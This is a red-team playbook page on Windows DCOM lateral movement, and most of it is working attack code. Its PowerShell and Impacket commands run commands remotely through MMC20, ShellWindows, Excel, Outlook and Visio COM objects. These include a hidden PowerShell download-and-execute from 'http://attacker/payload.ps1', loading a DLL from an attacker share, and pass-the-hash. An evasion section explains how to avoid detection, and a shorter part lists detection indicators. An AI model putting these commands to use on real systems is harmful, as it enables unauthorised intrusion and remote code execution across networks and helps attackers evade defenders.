# DCOM Lateral Movement

> **MITRE ATT&CK**: Lateral Movement > T1021.003 - Remote Services: Distributed Component Object Model
> **Platforms**: Windows
> **Required Privileges**: Local Administrator on target
> **OPSEC Risk**: Low-Medium

## Strategic Overview

Distributed Component Object Model (DCOM) is a Windows technology that allows Component Object Model (COM) objects to communicate across the network. Several COM objects expose methods that permit arbitrary command execution, making DCOM a powerful and relatively stealthy lateral movement vector. DCOM-based attacks are less commonly monitored than PsExec or WMI because they leverage legitimate Windows infrastructure that many security teams overlook. The technique requires no service creation, no binary uploads, and no scheduled tasks -- execution happens through the instantiation of COM objects on the remote host. The key limitation is that DCOM uses RPC (TCP 135 + dynamic ports), and the attacker must know which COM objects are available and how to invoke them. From a red team lead's perspective, DCOM is the go-to technique when PsExec and WMI are heavily monitored, as it operates through a less-scrutinized channel.

### Advantages Over Other Methods

- No service creation (unlike PsExec/smbexec)
- No binary upload to disk (unlike PsExec)
- No WMI event logging (unlike WMI-based execution)
- Uses legitimate Windows COM infrastructure
- Less monitored than SMB or WMI-based execution
- Multiple COM objects available (harder to build comprehensive detection)

## Technical Deep-Dive

### 1. MMC20.Application (Most Common)

```powershell
# MMC20.Application exposes ExecuteShellCommand via the Document.ActiveView object
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "192.168.1.50"))

# Execute a command (parameters: Command, Directory, Parameters, WindowState)
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\Windows\Temp\dcom_out.txt", "7")

# Execute PowerShell payload
$com.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')", "7")

# Execute with specific binary
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", $null, "-enc BASE64_PAYLOAD", "7")

# WindowState 7 = minimized, 0 = hidden (varies by target OS)
```

### 2. ShellWindows (Explorer.exe Required)

```powershell
# ShellWindows requires an active explorer.exe process on the target (user logged in)
# CLSID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "192.168.1.50"))

# Navigate to get Shell object and execute
$item = $com.item()
$item.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\Windows\Temp\out.txt", "C:\Windows\System32", $null, 0)

# Execute PowerShell
$item.Document.Application.ShellExecute("powershell.exe", "-nop -w hidden -enc BASE64", "C:\Windows\System32", $null, 0)

# Note: This executes in the context of the logged-in user's explorer.exe session
# The process will appear as a child of explorer.exe (very natural)
```

### 3. ShellBrowserWindow

```powershell
# ShellBrowserWindow -- similar to ShellWindows but uses a different CLSID
# CLSID: C08AFD90-F2A1-11D1-8455-00A0C91F3880
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "192.168.1.50"))

# Execute command
$com.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\Windows\Temp\out.txt", "C:\Windows\System32", $null, 0)

# This also requires an active explorer.exe session on the target
# Difference from ShellWindows: returns a single window rather than a collection
```

### 4. Excel.Application (Office Required)

```powershell
# Requires Microsoft Excel installed on the target
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.1.50"))

# Method 1: RegisterXLL to load a DLL
$excel.RegisterXLL("\\attacker_ip\share\payload.dll")

# Method 2: ExecuteExcel4Macro for command execution
$excel.ExecuteExcel4Macro('EXEC("cmd.exe /c whoami > C:\temp\out.txt")')

# Method 3: Run a VBA macro from a workbook
$excel.Workbooks.Open("\\attacker_ip\share\macro_workbook.xlsm")
$excel.Run("MacroName")

# Cleanup
$excel.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($excel) | Out-Null
```

### 5. Outlook.Application (Office Required)

```powershell
# Requires Microsoft Outlook installed on the target
$outlook = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application", "192.168.1.50"))

# Create a Shell object via Outlook's scripting capabilities
$shell = $outlook.CreateObject("Wscript.Shell")
$shell.Run("cmd.exe /c whoami > C:\temp\out.txt", 0, $false)
```

### 6. Visio.InvisibleApp (Office Required)

```powershell
# Requires Microsoft Visio installed on the target
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", "192.168.1.50"))

# Execute via Visio addon
$visio.Addons.Add("C:\Windows\System32\cmd.exe").Run("/c whoami > C:\temp\out.txt")
```

### 7. Impacket dcomexec.py

```bash
# Impacket provides a dedicated DCOM execution tool
dcomexec.py corp.local/administrator:'P@ssw0rd'@192.168.1.50

# With hash
dcomexec.py corp.local/administrator@192.168.1.50 -hashes :HASH

# Specify COM object to use
dcomexec.py corp.local/administrator:'P@ssw0rd'@192.168.1.50 -object MMC20
dcomexec.py corp.local/administrator:'P@ssw0rd'@192.168.1.50 -object ShellWindows
dcomexec.py corp.local/administrator:'P@ssw0rd'@192.168.1.50 -object ShellBrowserWindow

# Execute specific command
dcomexec.py corp.local/administrator:'P@ssw0rd'@192.168.1.50 "whoami /all"
```

### 8. Discovering Exploitable DCOM Objects

```powershell
# Enumerate COM objects on a remote host that might allow execution
# List all DCOM applications
Get-CimInstance Win32_DCOMApplication

# Find COM objects with specific methods (local enumeration, apply to remote)
$clsids = Get-ChildItem HKLM:\SOFTWARE\Classes\CLSID | ForEach-Object { $_.PSChildName }
foreach ($clsid in $clsids) {
    try {
        $obj = [activator]::CreateInstance([type]::GetTypeFromCLSID($clsid))
        $members = $obj | Get-Member | Where-Object { $_.Name -match "Exec|Run|Shell|Create|Open" }
        if ($members) {
            Write-Output "CLSID: $clsid - Methods: $($members.Name -join ', ')"
        }
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($obj) | Out-Null
    } catch {}
}
```

## Detection & Evasion

### Detection Indicators

- **Event ID 4624** (Logon Type 3) associated with DCOM authentication
- Process creation events where the parent is a DCOM server process (svchost.exe DcomLaunch, mmc.exe, excel.exe)
- Unusual child processes of explorer.exe when ShellWindows/ShellBrowserWindow is used
- RPC traffic on TCP 135 followed by dynamic high-port connections
- DCOM launch events in the System log (Event ID 10016 for permission errors)
- Sysmon Event ID 1 with unusual parent-child process relationships (e.g., mmc.exe spawning cmd.exe)
- COM object instantiation from remote IP addresses

### Evasion Techniques

- DCOM is less commonly monitored than WMI or SMB-based execution
- ShellWindows/ShellBrowserWindow spawn processes as children of explorer.exe (very natural)
- Avoid MMC20.Application on systems where mmc.exe spawning cmd.exe would be anomalous
- Use COM objects that match installed software (Excel on workstations, not servers)
- Retrieve command output through alternative channels rather than file writes to common temp directories
- Limit the number of DCOM connections to avoid network-level anomaly detection
- Close COM object references properly to avoid orphaned processes

### Limitations

- Firewall rules may block RPC dynamic ports (135 open but high ports blocked)
- ShellWindows and ShellBrowserWindow require an active user session with explorer.exe
- Office-based COM objects require the respective Office application installed
- Some COM objects may trigger application GUI windows on the target

## Cross-References

- [[wmi-lateral]] - WMI also uses DCOM/RPC transport but is more heavily monitored
- [[psexec-smbexec]] - SMB-based alternative (noisier but more reliable)
- [[winrm-lateral]] - WinRM alternative when RPC ports are blocked
- Section 04: Discovery - DCOM object enumeration during reconnaissance
- Section 07: Persistence - DCOM-based persistence mechanisms

## References

- https://attack.mitre.org/techniques/T1021/003/
- https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
- https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
- https://www.cybereason.com/blog/dcom-lateral-movement-techniques
- https://github.com/fortra/impacket/blob/master/examples/dcomexec.py
